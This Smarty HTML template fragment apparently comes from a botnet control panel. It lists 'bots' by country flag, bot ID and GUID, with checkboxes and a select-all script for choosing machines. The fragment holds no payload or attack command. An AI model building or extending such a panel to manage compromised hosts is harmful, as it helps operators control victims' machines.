<td colspan='5'>
<form id='frm_bots'>
<hr color="#dddddd" size="1">
<center>
	&nbsp;<a href="javascript:void(0)" onClick="CheckAll2('bots', true);">Select All</a> &nbsp;&nbsp;
	<a href="javascript:void(0)" onClick="CheckAll2('bots', false);">Unselect All</a
	
<table style="border: 1px solid lightgray; font-size: 9px; border-collapse: collapse; background-color: rgb(255, 255, 255);" border="1" cellpadding="3" cellspacing="0" width="500">
<th style='width:30px;'>#</th><th style='width:40px;'>Country</th><th style='width:40px;'>BOT ID</th><th>GUID</th><th style='width:20px;'></th>

{foreach from=$BOTS item=BOT name=bloop}
	<tr id='tr{$BOT.id_bot}'><td style='text-align:center;'>{$smarty.foreach.bloop.iteration}</td>
	<td style='text-align:center;'><img src='img/flags/{$BOT.CCODE}.gif'</td>
	<td style='text-align:center;'>{$BOT.id_bot}</td>
	<td style='text-align:center;'>{$BOT.guid_bot}</td>
	<td style='text-align:center;'><input type='checkbox' style='margin:0px;' name='bots[{$BOT.id_bot}]' checked></td>
	</tr>
{foreachelse}
	<tr><td colspan='5' align='center' class='error'>There are no bots for this query!</td></tr>
{/foreach}
</table>
</form>
</td>

{literal}
<script>
function CheckAll2(name, checked) 
{
	f = document.getElementById('frm_bots');
	for (var i = 0; i < f.elements.length; i++) 
	{
		if(f.elements[i].type == 'checkbox' && f.elements[i].name.substr(0, name.length) == name)
		{
			f.elements[i].checked = checked;
		}
	}
}
</script>
{/literal}